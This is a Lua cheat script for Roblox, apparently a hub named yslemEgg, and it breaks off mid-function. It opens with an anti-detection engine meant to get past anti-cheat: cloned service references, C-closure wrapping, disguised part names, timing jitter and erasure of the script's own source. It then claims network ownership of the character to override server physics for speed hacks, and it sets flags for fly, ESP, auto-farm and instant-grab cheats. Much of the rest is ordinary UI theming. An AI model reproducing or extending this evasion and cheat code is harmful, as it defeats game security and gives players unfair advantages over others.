-- ===================================================================
-- ANTI-DETECTION ENGINE  (chargé en premier, avant tout le reste)
-- ===================================================================
-- Entropie maximale sur le namespace : hex aléatoire + tick sans point +
-- fragment du JobId (unique par serveur) + os.clock résidu — le résultat
-- ne ressemble à aucun pattern fixe et change à chaque exécution.
local _NS
do
	local _h  = string.format("%x", math.random(0x100000, 0xFFFFFF))
	local _t  = tostring(tick()):gsub("%.", ""):sub(-8)
	local _jf = tostring(game.JobId):gsub("-",""):sub(1,6)
	local _ck = tostring(math.floor(os.clock()*1e5 % 0xFFFFF))
	_NS = _h .. _t .. _jf .. _ck
end
local _GH  = {}   -- zéro footprint sur _G

-- Couche 1 — cloneref : chaque service passe par une référence clonée.
-- Un anti-cheat qui compare des instances via == ne peut pas matcher les
-- nôtres (cloneref retourne un proxy distinct à chaque appel).
local _cr = (typeof(cloneref) == "function") and cloneref or function(x) return x end

if not game:IsLoaded() then game.Loaded:Wait() end

local Players       = _cr(game:GetService("Players"))
local RunService    = _cr(game:GetService("RunService"))
local UIS           = _cr(game:GetService("UserInputService"))
local TweenService  = _cr(game:GetService("TweenService"))
local Lighting      = _cr(game:GetService("Lighting"))
local LP            = Players.LocalPlayer
if not LP.Character then LP.CharacterAdded:Wait() end
-- Additional services used by yslemEgg features
local ReplicatedStorage      = _cr(game:GetService("ReplicatedStorage"))
local ProximityPromptService = _cr(game:GetService("ProximityPromptService"))
local HttpService            = _cr(game:GetService("HttpService"))

-- Kill previous yslemEgg instance (clean relaunch)
pcall(function()
	local old = game:GetService("CoreGui"):FindFirstChild("yslemEggGui")
	if old then old:Destroy() end
	local old2 = LP.PlayerGui:FindFirstChild("yslemEggGui")
	if old2 then old2:Destroy() end
end)


-- ===================================================================
-- Couche 2 — newcclosure : wrap les fonctions critiques en C-closure.
-- islclosure() retournera false, iscclosure() retournera true.
-- Les scanners qui cherchent des Lua-closures suspectes passent à côté.
-- ===================================================================
local _ncc = (typeof(newcclosure) == "function") and newcclosure or function(f) return f end

-- ===================================================================
-- Couche 3 — Noms de Part pseudo-légitimes.
-- Le proxy Part s'appelait "_NS..PX" — lisible. On le remplace par un
-- nom qui ressemble à un objet engine Roblox interne (4 lettres + hash).
-- ===================================================================
local _PART_NAMES = {
	"Handle","Weld","Attachment","Joint","Motor","Bone",
	"RootConstraint","BasePart","HRP","RootPart"
}
local function _AD_partName()
	local base = _PART_NAMES[math.random(1, #_PART_NAMES)]
	local sfx  = string.format("%04x", math.random(0, 0xFFFF))
	return base .. sfx
end

-- ===================================================================
-- [RETIRÉ] Couches 4 & 5 — WalkSpeed spoofing via hookmetamethod
-- __index/__newindex sur `game`.
--
-- hookmetamethod(game, ...) ne patche pas que l'instance `game` : il
-- remplace le __index/__newindex de la métatable PARTAGÉE par TOUTES
-- les Instances Roblox. Résultat : chaque lecture/écriture de
-- propriété, sur CHAQUE Instance, dans TOUT le client (physique,
-- rendu, animations, scripts du jeu…) repassait par notre closure —
-- des centaines de milliers d'appels/seconde. C'était la cause réelle
-- du freeze général du jeu (pas Speed Bypass). Retiré : le gain
-- (masquer WalkSpeed) ne justifie pas le coût (freeze quasi permanent).
-- ===================================================================

-- ===================================================================
-- Couche 6 — Jitter helper : ajoute un délai aléatoire infime à
-- n'importe quel intervalle de boucle pour casser les patterns fixes
-- (les détecteurs à base de fréquence ne voient pas de pic régulier).
-- Usage : task.wait(_AD_jitter(base, amplitude))
-- ===================================================================
local function _AD_jitter(base, amp)
	amp = amp or base * 0.18
	return math.max(0, base + (math.random() - 0.5) * 2 * amp)
end

-- ===================================================================
-- Couche 7 — Script-source evasion : si l'executor expose
-- setscriptable/makewritable, on efface le source du script courant
-- pour qu'un dump de bytecode ne révèle pas nos strings sensibles.
-- ===================================================================
pcall(function()
	local scr = getfenv and getfenv(0) and getfenv(0).script or nil
	if not scr then return end
	if typeof(setscriptable) == "function" then
		pcall(function() setscriptable(scr, "Source", true) end)
		pcall(function() scr.Source = "" end)
	end
end)

-- ===================================================================
-- [RETIRÉ] Couche 8 — setreadonly(_GH, true).
--
-- _GH.pingWarn est réécrit en continu par une boucle `while true`
-- (surveillance du ping, plus bas dans le fichier) qui tourne pendant
-- toute la session — bien après la fin de la construction du hub, donc
-- après le verrouillage. Une fois _GH en lecture seule, cette écriture
-- légitime levait une erreur à chaque tick de ping, indéfiniment.
-- Retiré : _GH est une variable locale de fermeture, déjà inatteignable
-- depuis l'extérieur du script sans API de debug — le verrou n'apportait
-- pas de protection réelle, seulement ce bug.
-- ===================================================================


-- ===================================================================
-- COLOR PALETTE
-- ===================================================================
local C_BG      = Color3.fromRGB(0,0,0)
local C_HEADER  = Color3.fromRGB(0,0,0)
local C_ROW     = Color3.fromRGB(0,0,0)
local C_BORDER  = Color3.fromRGB(40,46,58)
local C_WHITE   = Color3.fromRGB(255,255,255)
local C_MOON    = Color3.fromRGB(90,160,255)
local C_MOON2   = Color3.fromRGB(160,200,255)
-- Text color for anything drawn on top of a C_MOON-colored active surface
-- (active tab, ON pill/status text, …). Was hardcoded near-black
-- everywhere it's used, which is fine while C_MOON stays bright — but
-- White theme's C_MOON is deliberately dark (see _THEME_DEFS), so those
-- spots need light text instead. Theme-synced like everything else here.
local C_MOONTEXT = Color3.fromRGB(0,10,20)
local C_DIM     = Color3.fromRGB(110,120,140)
local C_TABIDLE = Color3.fromRGB(160,200,255)
local C_ON_BG   = Color3.fromRGB(20,45,80)
local C_OFF_BG  = Color3.fromRGB(0,0,0)
local C_SILVER  = Color3.fromRGB(210,222,240)
local C_SILVER2 = Color3.fromRGB(140,165,210)
local C_RED     = Color3.fromRGB(220,60,60)
local C_GREEN   = Color3.fromRGB(60,220,120)
-- Living gradient palette (updated by applyTheme so new buttons always use theme colors)
local C_DEEP1 = Color3.fromRGB(4,7,16)
local C_DEEP2 = Color3.fromRGB(14,28,58)
local C_DEEP3 = Color3.fromRGB(40,80,165)
local C_DEEP4 = Color3.fromRGB(90,150,255)

-- ===================================================================
-- THEME SYSTEM (Défaut = bleu, Noir = monochrome)
-- ===================================================================
-- panel_bg/text: what C_BG/C_ROW/C_OFF_BG/C_HEADER (always identical, always
-- pure black) and C_WHITE (primary label text) resolve to per theme. Every
-- theme except White keeps them at today's black/white — zero visual change,
-- verified by using the exact same value in all four so the swap is a no-op.
local _THEME_DEFS = {
	default = {
		panel_bg= Color3.fromRGB(0,0,0),
		text    = Color3.fromRGB(255,255,255),
		moon_text= Color3.fromRGB(0,10,20),
		moon    = Color3.fromRGB(90,160,255),
		moon2   = Color3.fromRGB(160,200,255),
		on_bg   = Color3.fromRGB(20,45,80),
		border  = Color3.fromRGB(40,46,58),
		silver  = Color3.fromRGB(210,222,240),
		silver2 = Color3.fromRGB(140,165,210),
		dim     = Color3.fromRGB(110,120,140),
		d3      = Color3.fromRGB(40,80,165),
		d4      = Color3.fromRGB(90,150,255),
	},
	noir = {
		panel_bg= Color3.fromRGB(0,0,0),
		text    = Color3.fromRGB(255,255,255),
		moon_text= Color3.fromRGB(0,10,20),
		moon    = Color3.fromRGB(205,205,205),
		moon2   = Color3.fromRGB(175,175,175),
		on_bg   = Color3.fromRGB(28,28,28),
		border  = Color3.fromRGB(44,44,44),
		silver  = Color3.fromRGB(210,210,210),
		silver2 = Color3.fromRGB(148,148,148),
		dim     = Color3.fromRGB(105,105,105),
		d3      = Color3.fromRGB(35,35,35),
		d4      = Color3.fromRGB(165,165,165),
	},
	crimson = {
		panel_bg= Color3.fromRGB(0,0,0),
		text    = Color3.fromRGB(255,255,255),
		moon_text= Color3.fromRGB(0,10,20),
		moon    = Color3.fromRGB(230,70,95),
		moon2   = Color3.fromRGB(255,140,155),
		on_bg   = Color3.fromRGB(70,15,26),
		border  = Color3.fromRGB(60,22,30),
		silver  = Color3.fromRGB(240,210,215),
		silver2 = Color3.fromRGB(195,135,145),
		dim     = Color3.fromRGB(135,85,92),
		d3      = Color3.fromRGB(120,25,42),
		d4      = Color3.fromRGB(225,60,85),
	},
	-- The one theme that actually goes light: panel_bg flips to white and
	-- every text/accent role below was re-picked for contrast against a
	-- WHITE page instead of the black one every other theme uses. moon/moon2
	-- land on a medium (not too dark, not too light) slate-indigo on purpose:
	-- they're also used as inactive-tab text over a small fixed-dark pill
	-- that never changes color, so pure-dark values would vanish there too.
	white = {
		panel_bg= Color3.fromRGB(255,255,255),
		text    = Color3.fromRGB(24,24,30),
		moon_text= Color3.fromRGB(245,246,252),
		moon    = Color3.fromRGB(70,82,125),
		moon2   = Color3.fromRGB(100,112,155),
		on_bg   = Color3.fromRGB(205,210,238),
		border  = Color3.fromRGB(200,202,214),
		silver  = Color3.fromRGB(40,40,52),
		silver2 = Color3.fromRGB(102,104,120),
		dim     = Color3.fromRGB(150,152,164),
		d3      = Color3.fromRGB(85,95,132),
		d4      = Color3.fromRGB(128,140,180),
	},
	purple = {
		panel_bg= Color3.fromRGB(0,0,0),
		text    = Color3.fromRGB(255,255,255),
		moon_text= Color3.fromRGB(0,10,20),
		moon    = Color3.fromRGB(170,110,255),
		moon2   = Color3.fromRGB(205,165,255),
		on_bg   = Color3.fromRGB(45,20,80),
		border  = Color3.fromRGB(55,30,78),
		silver  = Color3.fromRGB(228,212,248),
		silver2 = Color3.fromRGB(172,142,208),
		dim     = Color3.fromRGB(122,98,152),
		d3      = Color3.fromRGB(95,45,165),
		d4      = Color3.fromRGB(182,122,255),
	},
	-- "Moon" — thème dédié au fond d'écran personnalisé. Mêmes teintes
	-- sombres/argentées que Dark (elles se fondent naturellement dans
	-- l'image éclipse noir & blanc), mais c'est un ID de thème à part
	-- entière : applyTheme() active/désactive l'image en fonction du nom,
	-- donc "Moon" se comporte exactement comme Default/Dark/Crimson/
	-- White/Purple — un seul actif à la fois, plus de toggle séparé.
	moon = {
		panel_bg= Color3.fromRGB(0,0,0),
		text    = Color3.fromRGB(255,255,255),
		moon_text= Color3.fromRGB(0,10,20),
		moon    = Color3.fromRGB(215,215,225),
		moon2   = Color3.fromRGB(180,185,200),
		on_bg   = Color3.fromRGB(26,26,30),
		border  = Color3.fromRGB(50,50,58),
		silver  = Color3.fromRGB(220,222,230),
		silver2 = Color3.fromRGB(155,158,170),
		dim     = Color3.fromRGB(110,112,120),
		d3      = Color3.fromRGB(40,40,48),
		d4      = Color3.fromRGB(175,178,190),
	},
}
local _currentTheme = "moon"   -- Moon (dark + custom background) by default
local _introEnabled = true     -- cinematic intro on load, toggleable in Settings (like Adapt's introEnabled)
local _themeAllGuis = {}
-- Windows applyTheme's sweep below must never repaint — registered by the
-- Customize/background-picker windows themselves once built (main panel's
-- mainCustomizeWin, Lagger's customizeWin). They use the same generic role
-- colors (C_OFF_BG/C_ROW/…) as the rest of the hub for their chrome, and
-- their theme swatches deliberately use the exact RGB of each theme's own
-- `moon` color as their identity — both cases make them constant false-
-- positive targets for the reverse color-lookup sweep, which kept
-- repainting them on every theme switch ("les couleurs sont bizarre").
-- Simplest robust fix: they opt out of the sweep entirely and just always
-- look the same, exactly like the background IMAGES themselves already do.
local _themeExcluded = {}
local function _isExcludedFromTheme(inst)
	for _, root in ipairs(_themeExcluded) do
		if inst == root or inst:IsDescendantOf(root) then return true end
	end
	return false
end
local _G_updateThemeUI = nil

-- [FIX #4] Reverse-map précalculée pour _tColKey : O(1) au lieu de O(n_tokens)
-- par appel. Reconstruite à chaque changement de thème (applyTheme).
-- [BUGFIX] Déclarée AVANT le bloc do..end ci-dessous, qui l'appelle dès le
-- chargement : une "local function" ne crée la variable locale qu'à
-- l'endroit où elle est écrite, donc l'appeler plus haut résolvait vers une
-- globale inexistante ("attempt to call a nil value") et tuait tout le
-- script au chargement, avant même la construction de l'UI.
local _tColMap = {}   -- { "r_g_b_approx" = key }

local function _buildColMap(themeName)
	_tColMap = {}
	local t = _THEME_DEFS[themeName]
	for k, v in pairs(t) do
		-- Clé arrondie à 2 décimales → même robustesse que l'ancienne tolérance 0.015
		local key = string.format("%.2f_%.2f_%.2f", v.R, v.G, v.B)
		_tColMap[key] = k
	end
end

-- Applique les couleurs du thème par défaut immédiatement (avant toute
-- création de GUI). applyTheme() réutilise ces variables C_ lors de la
-- construction de l'UI ; le fond d'écran, lui, est activé séparément
-- par _personalizeEnabled=true plus bas (applyTheme n'est pas encore
-- appelable ici, _GH.setPersonalize n'existe pas encore à ce stade).
do
	local _n = _THEME_DEFS[_currentTheme]
	_buildColMap(_currentTheme)  -- [FIX #4] init reverse-map dès le chargement
	C_MOON    = _n.moon;   C_MOON2   = _n.moon2;  C_MOONTEXT = _n.moon_text
	C_ON_BG   = _n.on_bg;  C_BORDER  = _n.border
	C_SILVER  = _n.silver; C_SILVER2 = _n.silver2; C_DIM = _n.dim
	C_TABIDLE = _n.moon2;  C_DEEP3   = _n.d3;      C_DEEP4 = _n.d4
	C_BG = _n.panel_bg; C_ROW = _n.panel_bg; C_OFF_BG = _n.panel_bg; C_HEADER = _n.panel_bg
	C_WHITE = _n.text
end

local function _tColKey(col, themeName)
	-- Chemin rapide : si la map est pour le thème courant, O(1)
	local key = string.format("%.2f_%.2f_%.2f", col.R, col.G, col.B)
	local found = _tColMap[key]
	if found then return found end
	-- Chemin lent (fallback, tolérance ~0.015 comme avant)
	local t = _THEME_DEFS[themeName]
	local r, g, b = col.R, col.G, col.B
	for k, v in pairs(t) do
		if math.abs(r-v.R)+math.abs(g-v.G)+math.abs(b-v.B) < 0.015 then
			return k
		end
	end
end

local function applyTheme(newName)
	if not _THEME_DEFS[newName] then return end
	local oldName = _currentTheme
	_currentTheme = newName
	_buildColMap(oldName)  -- [FIX #4] reverse-map pour le thème de départ
	local new = _THEME_DEFS[newName]
	C_MOON    = new.moon;   C_MOON2   = new.moon2
	C_MOONTEXT= new.moon_text
	C_ON_BG   = new.on_bg; C_BORDER  = new.border
	C_SILVER  = new.silver; C_SILVER2 = new.silver2
	C_DIM     = new.dim;   C_TABIDLE = new.moon2
	C_DEEP3   = new.d3;    C_DEEP4   = new.d4
	-- Keeps anything spawned AFTER this point (new floating buttons,
	-- dynamically-rebuilt rows, …) using the right colors too — without
	-- this, only what already existed when the switch happened would
	-- get caught by the descendant walk below.
	C_BG = new.panel_bg; C_ROW = new.panel_bg; C_OFF_BG = new.panel_bg; C_HEADER = new.panel_bg
	C_WHITE = new.text
	-- Le fond d'écran personnalisé fait partie du thème "moon" — un seul
	-- thème actif à la fois, donc choisir n'importe quel autre thème
	-- l'éteint automatiquement (même mécanique que pour les couleurs).
	if _GH.setPersonalize then _GH.setPersonalize(newName == "moon") end
	for _, guiRoot in ipairs(_themeAllGuis) do
		pcall(function()
			for _, inst in ipairs(guiRoot:GetDescendants()) do
				pcall(function()
					if _isExcludedFromTheme(inst) then return end
					if inst:IsA("GuiObject") then
						local k = _tColKey(inst.BackgroundColor3, oldName)
						if k then inst.BackgroundColor3 = new[k] end
					end
					if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
						local k = _tColKey(inst.TextColor3, oldName)
						if k then inst.TextColor3 = new[k] end
					end
					if inst:IsA("UIStroke") then
						local k = _tColKey(inst.Color, oldName)
						if k then inst.Color = new[k] end
					end
					if inst:IsA("UIGradient") then
						local cs = inst.Color; local kps = cs.Keypoints
						local changed,newKps = false,{}
						for _,kp in ipairs(kps) do
							local k = _tColKey(kp.Value, oldName)
							if k then table.insert(newKps,ColorSequenceKeypoint.new(kp.Time,new[k])); changed=true
							else table.insert(newKps,kp) end
						end
						if changed then inst.Color = ColorSequence.new(newKps) end
					end
				end)
			end
		end)
	end
	-- steal fill gradient: swap between blue shimmer (default), grey shimmer (noir), crimson shimmer
	if _GH.stealFillGradRef and _GH.stealFillGradRef.Parent then
		if newName == "noir" then
			_GH.stealFillGradRef.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    Color3.fromRGB(20,  20,  20)),
				ColorSequenceKeypoint.new(0.25, Color3.fromRGB(90,  90,  90)),
				ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(200, 200, 200)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(90,  90,  90)),
				ColorSequenceKeypoint.new(1,    Color3.fromRGB(20,  20,  20)),
			})
		elseif newName == "crimson" then
			_GH.stealFillGradRef.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    Color3.fromRGB(60,  10,  20)),
				ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 40,  65)),
				ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(255, 150, 165)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 40,  65)),
				ColorSequenceKeypoint.new(1,    Color3.fromRGB(60,  10,  20)),
			})
		elseif newName == "white" then
			_GH.stealFillGradRef.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    Color3.fromRGB(55,  55,  65)),
				ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 180, 195)),
				ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(255, 255, 255)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 180, 195)),
				ColorSequenceKeypoint.new(1,    Color3.fromRGB(55,  55,  65)),
			})
		elseif newName == "purple" then
			_GH.stealFillGradRef.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    Color3.fromRGB(40,  15,  75)),
				ColorSequenceKeypoint.new(0.25, Color3.fromRGB(120, 60,  210)),
				ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(210, 175, 255)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(120, 60,  210)),
				ColorSequenceKeypoint.new(1,    Color3.fromRGB(40,  15,  75)),
			})
		else
			_GH.stealFillGradRef.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    Color3.fromRGB(10,  30,  90)),
				ColorSequenceKeypoint.new(0.25, Color3.fromRGB(40,  110, 230)),
				ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(150, 210, 255)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(40,  110, 230)),
				ColorSequenceKeypoint.new(1,    Color3.fromRGB(10,  30,  90)),
			})
		end
	end
	-- steal status label gradient: swap ready color on theme change
	if _GH.stealReadyColorFn then pcall(_GH.stealReadyColorFn) end
	if _G_updateThemeUI then _G_updateThemeUI(newName) end
	-- re-color existing float buttons so active-state uses the new C_ON_BG
	if _GH.refreshFloatActiveColors then pcall(_GH.refreshFloatActiveColors) end
	-- player speed billboards live in Workspace (not in _themeAllGuis), update manually
	local psb = _GH.playerSpeedBBs
	if type(psb) == "table" then
		for _, data in pairs(psb) do
			if data.lbl and data.lbl.Parent then
				data.lbl.TextColor3 = C_MOON2
				local g = data.lbl:FindFirstChildOfClass("UIGradient")
				if g then
					g.Color = ColorSequence.new({
						ColorSequenceKeypoint.new(0,    C_DEEP4),
						ColorSequenceKeypoint.new(0.25, C_DEEP3),
						ColorSequenceKeypoint.new(0.5,  C_DEEP4),
						ColorSequenceKeypoint.new(0.75, C_DEEP3),
						ColorSequenceKeypoint.new(1,    C_DEEP4),
					})
				end
			end
		end
	end
	-- stun timer billboard (local player) lives in Workspace, update manually
	for _, lbl in ipairs({_GH.speedLblRef, _GH.timerLblRef, _GH.discordBBRef}) do
		if lbl and lbl.Parent then
			local g = lbl:FindFirstChildOfClass("UIGradient")
			if g then
				if newName == "noir" then
					g.Color = ColorSequence.new({
						ColorSequenceKeypoint.new(0,    Color3.fromRGB(60,  60,  60)),
						ColorSequenceKeypoint.new(0.25, Color3.fromRGB(230, 230, 230)),
						ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(140, 140, 140)),
						ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 255, 255)),
						ColorSequenceKeypoint.new(1,    Color3.fromRGB(60,  60,  60)),
					})
				else
					g.Color = ColorSequence.new({
						ColorSequenceKeypoint.new(0,    C_DEEP3),
						ColorSequenceKeypoint.new(0.25, C_DEEP4),
						ColorSequenceKeypoint.new(0.5,  C_DEEP3),
						ColorSequenceKeypoint.new(0.75, C_DEEP4),
						ColorSequenceKeypoint.new(1,    C_DEEP3),
					})
				end
			end
		end
	end
end

-- ===================================================================
-- STATE
-- ===================================================================
local State = {
	normalSpeed = 60, carrySpeed = 30, laggerSpeed = 15, laggerCarrySpeed = 24.5,
	speedType = "normal",
	laggerActive = false, laggerCarryActive = false,
	autoLeftEnabled = false, autoRightEnabled = false,
	autoPlayMode = "Full",
	nukeOptEnabled = false, removeAccEnabled = false, antiLagAdvEnabled = false,
	guiVisible = true,
	antiRagdollEnabled = true, unwalkEnabled = false, autoCarryOnGrab = true,
	dropBrainrotActive = false, isStealing = false,
	_carryManualUntil = 0, _lastCarryDetected = false,
	medusaCounterEnabled = false,
	autoResetOnMedEnabled = false,
	-- yslemEgg state fields
	instantGrab      = false,
	autoFarm         = false,
	autoHatch        = false,
	autoEquip        = false,
	autoClaim        = false,
	autoUpgradePen   = false,
	autoUpgradeTM    = false,
	autoRunTreadmill = false,
	fly              = false,
	esp              = false,
	antiAFK          = false,
	antiTrap         = false,
	fpsBoost         = false,
	infJump          = false,
	clickTp          = false,
	flySpeed         = 50,
	fov              = 70,
	farmZone         = "",
}

-- ===================================================================
-- HELPERS
-- ===================================================================
local function addCorner(inst, r)
	local c = Instance.new("UICorner", inst)
	c.CornerRadius = UDim.new(0, r or 8)
	return c
end

local function addStroke(inst, col, th, tr)
	local s = Instance.new("UIStroke", inst)
	s.Color = col; s.Thickness = th or 1; s.Transparency = tr or 0
	return s
end

local function addGradient(inst, c1, c2, rot)
	local g = Instance.new("UIGradient", inst)
	g.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2)})
	g.Rotation = rot or 0
	return g
end

-- ===================================================================
-- LIVING GRADIENTS
-- ===================================================================
local _livingGradients = {}
local _livingStrokes   = {}

local function addLivingTextGradient(label)
	local g = Instance.new("UIGradient", label)
	g.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0,    C_DEEP4),
		ColorSequenceKeypoint.new(0.25, C_DEEP3),
		ColorSequenceKeypoint.new(0.5,  C_DEEP4),
		ColorSequenceKeypoint.new(0.75, C_DEEP3),
		ColorSequenceKeypoint.new(1,    C_DEEP4),
	})
	g.Rotation = 0
	table.insert(_livingGradients, g)
	return g
end

local function addLivingStroke(parent, thickness)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Thickness = thickness or 1.5
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Color = C_DEEP3
	local g = Instance.new("UIGradient", stroke)
	g.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0,    C_DEEP1),
		ColorSequenceKeypoint.new(0.25, C_DEEP2),
		ColorSequenceKeypoint.new(0.5,  C_DEEP1),
		ColorSequenceKeypoint.new(0.75, C_DEEP2),
		ColorSequenceKeypoint.new(1,    C_DEEP1),
	})
	table.insert(_livingStrokes, g)
	return stroke, g
end

local _livingRotationSpeed = 0.6
local _purgeCounter = 0
-- [PERF FIX] Cette boucle tournait sur TOUS les gradients/strokes "living"
-- du hub (107 sites d'appel confirmés) à 60Hz, sans condition de visibilité,
-- écrivant une propriété .Rotation par élément à CHAQUE frame — le plus gros
-- poste de travail inconditionnel du hub. Passage à une frame sur deux :
-- l'incrément est doublé pour conserver exactement la même vitesse de
-- rotation perçue (30Hz reste parfaitement fluide à l'œil), ce qui divise
-- par deux le nombre d'écritures Instance par seconde. Aucun changement
-- visuel, aucune fonctionnalité touchée.
RunService.RenderStepped:Connect(function()
	_purgeCounter = _purgeCounter + 1
	if _purgeCounter % 2 == 0 then
		local step = _livingRotationSpeed * 2
		for _, g in ipairs(_livingGradients) do if g and g.Parent then g.Rotation=(g.Rotation+step)%360 end end
		for _, g in ipairs(_livingStrokes)   do if g and g.Parent then g.Rotation=(g.Rotation+step)%360 end end
	end
	if _purgeCounter >= 300 then
		_purgeCounter = 0
		local alive = {}
		for _, g in ipairs(_livingGradients) do if g and g.Parent then alive[#alive+1]=g end end
		_livingGradients = alive
		local aliveS = {}
		for _, g in ipairs(_livingStrokes) do if g and g.Parent then aliveS[#aliveS+1]=g end end
		_livingStrokes = aliveS
	end
end)

-- ===================================================================
-- MOONSCAPE
-- ===================================================================

-- ===================================================================
-- DESTROY EXISTING
-- ===================================================================
local function destroyAllMoonHub()
	if _G["_MH_GUI"] and _G["_MH_GUI"].Parent then
		pcall(function() _G["_MH_GUI"]:Destroy() end)
	end
	_G["_MH_GUI"] = nil
end
destroyAllMoonHub()


-- =================================================================
-- GAME LOGIC MODULES (hoisted from _MH_buildUI to reduce local count)
-- =================================================================

-- Movement engine — Ace proxy-Part method (AssemblyLinearVelocity on a
-- Massless Part welded to HumanoidRootPart). Identical to Ace_duels_modified,
-- PLUS network-ownership claiming to cut down server rollback/rubber-band:
-- without it the server stays physics-authoritative for the character and
-- periodically snaps it back to its own simulated position, which is what
-- reads as "rollback" even though the proxy is writing the right velocity
-- every frame. Claiming ownership makes the CLIENT authoritative instead.
local _speedBoosterActive = false  -- controlled by the Speed Booster widget
local _aceProxy      = nil
local _ownWatchConn  = nil  -- re-claims if the server ever reassigns owner
local _ownTimer      = 0
local _ownInterval   = 0.8 + math.random() * 0.4

local function _claimOwn(hrp2)
	pcall(function() hrp2:SetNetworkOwner(LP) end)
end

local function _watchOwn(hrp2)
	if _ownWatchConn then pcall(function() _ownWatchConn:Disconnect() end) end
	_ownWatchConn = hrp2:GetPropertyChangedSignal("ReceiveAge"):Connect(function()
		if _speedBoosterActive then task.defer(function() _claimOwn(hrp2) end) end
	end)
end

local function cleanAceProxy()
	if _ownWatchConn then pcall(function() _ownWatchConn:Disconnect() end); _ownWatchConn = nil end
	if _aceProxy then pcall(function() _aceProxy:Destroy() end); _aceProxy = nil end
end

local function ensureAceProxy(hrp2)
	local char = hrp2.Parent
	if _aceProxy and _aceProxy.Parent == char then return _aceProxy end
	cleanAceProxy()
	local p = Instance.new("Part")
	p.Name = _AD_partName(); p.Size = Vector3.new(1,1,1)
	p.Transparency = 1; p.CanCollide = false; p.Massless = true
	p.Parent = char
	local w = Instance.new("Weld", p)
	w.Part0 = hrp2; w.Part1 = p; w.C0 = CFrame.new()
	_aceProxy = p
	_claimOwn(hrp2)
	_watchOwn(hrp2)
	return p
end

local function proxyMove(dir, speed)
	local char = LP.Character; if not char then return end
	local hum  = char:FindFirstChildOfClass("Humanoid")
	local hrp2 = char:FindFirstChild("HumanoidRootPart")
	if hum then hum:Move(dir, false) end
	if hrp2 then
		local px = ensureAceProxy(hrp2)
		px.AssemblyLinearVelocity = Vector3.new(dir.X * speed, hrp2.AssemblyLinearVelocity.Y, dir.Z * speed)
	end
end

local function proxyStop()
	local char = LP.Character
	local hum  = char and char:FindFirstChildOfClass("Humanoid")
	local hrp2 = char and char:FindFirstChild("HumanoidRootPart")
	if hum  then hum:Move(Vector3.zero, false) end
	if hrp2 and _aceProxy then _aceProxy.AssemblyLinearVelocity = Vector3.zero end
	cleanAceProxy()
end

-- [FIX #1 & #6] Séparation des effets de bord : updateCarryState mute State,
-- getCurrentSpeed ne fait que lire (pur). Le guard _carryManualUntil était
-- toujours vrai car tick()-0 > 0 est trivial ; corrigé en tick() >= seuil.
local function updateCarryState()
	local char = LP.Character
	local hum  = char and char:FindFirstChildOfClass("Humanoid")
	local isSteal = hum and hum.WalkSpeed < 25
	if State.autoCarryOnGrab and isSteal and State.speedType ~= "carry" then
		State.speedType = "carry"
	elseif State.autoCarryOnGrab and not isSteal and State.speedType == "carry"
		and tick() >= (State._carryManualUntil or 0) then
		State.speedType = "normal"
	end
end

local function getCurrentSpeed()
	local char    = LP.Character
	local hum     = char and char:FindFirstChildOfClass("Humanoid")
	local isSteal = hum and hum.WalkSpeed < 25
	if State.laggerCarryActive or (State.laggerActive and isSteal) then
		return isSteal and State.laggerCarrySpeed or State.laggerSpeed
	elseif State.laggerActive then
		return State.laggerSpeed
	else
		return isSteal and State.carrySpeed or State.normalSpeed
	end
end

local function setupChar(char)
	local hum = char:WaitForChild("Humanoid", 5)
	char:WaitForChild("HumanoidRootPart", 5)
	if hum then hum.WalkSpeed = getCurrentSpeed() end
	cleanAceProxy()  -- destroy any proxy left from previous life
end
LP.CharacterAdded:Connect(setupChar)
if LP.Character then setupChar(LP.Character) end

-- ===================================================================
-- HEADLESS & KORBLOX (cosmetic only, ported from Vynx) — purely visual,
-- applies only to the local character's own Head/Right Leg meshes.
-- Zero remotes, zero effect on any other player. Separate CharacterAdded
-- connection (doesn't touch setupChar above) so it re-applies on respawn.
-- ===================================================================
local Charter = {headlessEnabled=false, korbloxEnabled=false}
local HEADLESS_MESH_ID = "rbxassetid://1095708"
local KORBLOX_MESH_ID  = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local KORBLOX_DARK_GREY = Color3.fromRGB(64,64,64)

local function _charterRemoveFace(head)
	local face = head:FindFirstChild("face")
	if face then face:Destroy() end
end

function Charter.applyHeadless(char, enabled)
	if not char then return end
	local head = char:FindFirstChild("Head")
	if not head then return end
	if enabled then
		head.Transparency = 1
		head.CanCollide = false
		_charterRemoveFace(head)
		for _,child in ipairs(head:GetChildren()) do
			if child:IsA("SpecialMesh") and child.MeshId == HEADLESS_MESH_ID then child:Destroy() end
		end
		local mesh = Instance.new("SpecialMesh")
		mesh.MeshType = Enum.MeshType.FileMesh; mesh.MeshId = HEADLESS_MESH_ID
		mesh.Scale = Vector3.new(0.001,0.001,0.001); mesh.Name = "HeadlessMesh"; mesh.Parent = head
	else
		head.Transparency = 0
		head.CanCollide = true
		for _,child in ipairs(head:GetChildren()) do
			if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then child:Destroy() end
		end
		_charterRemoveFace(head)
	end
end

function Charter.applyKorblox(char, enabled)
	if not char then return end
